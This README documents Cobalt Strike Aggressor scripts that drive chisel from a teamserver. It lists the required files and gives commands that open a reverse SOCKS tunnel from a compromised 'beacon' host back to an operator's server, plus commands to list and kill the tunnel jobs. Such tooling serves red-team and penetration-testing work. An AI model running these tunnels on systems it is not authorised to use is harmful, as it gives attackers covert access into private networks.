# Cobalt_Strike_scripts
Cobalt Strike Aggressor scripts

## Chisel script
The *chisel.cna* needs these files and these files must be located on the teamserver:
- logs/
  - chisel_client_job_pids.log
  - chisel_tms_job_pids.log
- modules/
  - chisel_linux
  - chisel_win.exe
  - chisel64
  - chisel64.exe
  - chisel86
  - chisel86.exe
- tools/
  - tmskill64.bat
  - tmskill64.sh
  - tmskill86.bat
  - tmskill86.sh

You must have write permissions to the log files.

You can download last versions of chisel from https://github.com/jpillora/chisel

Change *$chisel_user*, *$chisel_pass* in the *chisel.cna*.

### Modules
🔺 **chisel**

The 'client' functionality is used on a beacon. Example:
```
chisel client <serv_IP>:<serv_port> R:<socks_IP>:<socks_port>:socks
```

🔺 **chisel-jobs**

List active chisel jobs on the teamserver and beacon. Just run:
```
chisel-jobs
```

🔺 **chisel-kill**

Kill chisel jobs on a beacon. Use 'ALL' to kill all jobs or PID to kill only one job with typed PID. Example:
```
chisel-kill ALL
chisel-kill 3453
```

🔺 **chisel-tms**

Run Chisel on your teamserver. Example:
```
chisel-tms server --auth user:pass -p <serv_port> --socks5 --reverse
```

🔺 **chisel-tms-kill**

Kill all chisel jobs on the teamserver. Just run:
```
chisel-tms-kill
```

### Screenshots
![Chisel](/screens/ch_client.png)
![Chisel tms](/screens/ch_tms.png)
